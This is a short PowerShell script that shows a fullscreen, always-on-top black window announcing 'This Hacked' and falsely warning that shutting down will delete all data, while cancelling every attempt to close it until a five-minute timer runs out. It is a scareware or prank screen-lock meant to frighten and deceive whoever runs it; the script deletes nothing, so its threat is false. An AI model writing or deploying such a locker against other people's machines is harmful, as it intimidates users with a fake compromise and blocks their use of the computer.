Add-Type -AssemblyName PresentationFramework

# Create Fullscreen WPF Window
[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" ResizeMode="NoResize"
        WindowState="Maximized" Background="Black" Topmost="True">
    <Grid>
        <!-- Main Big Text -->
        <TextBlock Text="JAY MAHAKAL"
                   Foreground="Red"
                   FontSize="130"
                   FontWeight="Bold"
                   HorizontalAlignment="Center"
                   VerticalAlignment="Center"/>
        <!-- Sub Headline at Bottom -->
        <StackPanel VerticalAlignment="Bottom" HorizontalAlignment="Center" Margin="0,0,0,40">
            <TextBlock Text="This Hacked"
                       Foreground="White"
                       FontSize="40"
                       FontWeight="Bold"
                       HorizontalAlignment="Center"
                       TextAlignment="Center"/>
            <TextBlock Text="NOTE: IF YOU CLOSE YOUR SYSTEM OR POWER OFF THE WHOLE SYSTEM DATA IS DELETED, 
YOUR SYSTEM START AGAIN AFTER 6 MINUTES SO WAIT OR LOSE YOUR DATA."
                       Foreground="Red"
                       FontSize="22"
                       FontWeight="Bold"
                       TextWrapping="Wrap"
                       HorizontalAlignment="Center"
                       TextAlignment="Center"
                       Margin="0,10,0,0"/>
        </StackPanel>
    </Grid>
</Window>
"@

# Load XAML
$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)

# Block manual close
$script:allowClose = $false
$window.Add_Closing({ if (-not $script:allowClose) { $_.Cancel = $true } })

# Auto-close timer (5 minutes)
$timer = New-Object Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromMinutes(5)         
$timer.Add_Tick({
    $timer.Stop()
    $script:allowClose = $true
    $window.Close()
})

# Start timer when window shows
$window.Add_SourceInitialized({ $timer.Start() })

# Show window
$window.ShowDialog() | Out-Null